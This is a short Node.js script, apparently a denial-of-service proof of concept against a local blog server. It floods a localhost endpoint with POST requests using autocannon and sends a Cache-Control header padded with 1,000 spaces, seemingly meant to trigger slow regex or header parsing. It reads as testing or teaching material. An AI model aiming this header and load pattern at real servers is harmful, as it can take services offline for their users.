const axios = require("axios");
let data = JSON.stringify({
  title: "You!",
  content: "Blog content",
});

const autocannon = require("autocannon");

//😈 Evil cach-control header
const badCacheControlHeader =
  "max-age=604800" + " ".repeat(1000) + "must-revalidate";

autocannon(
  {
    url: "http://localhost:9000/blog/add",
    connections: 10000, //default
    pipelining: 1, // default
    duration: 30, // default
    workers: 4,
    method: "POST",
    body: data,
    headers: {
      "cache-control": badCacheControlHeader,
    },
  },
  (err, result) => {
    console.log("Result: ", result);
    console.log("Error: ", err);
  }
);

let config = {
  method: "post",
  maxBodyLength: Infinity,
  url: "http://localhost:9000/blog/add",
  headers: {
    "Content-Type": "application/json",
    "Cache-Control": badCacheControlHeader,
  },
  data: data,
};

// axios
//   .request(config)
//   .then((response) => {
//     console.log(JSON.stringify(response.data));
//   })
//   .catch((error) => {
//     console.log(error);
//   });
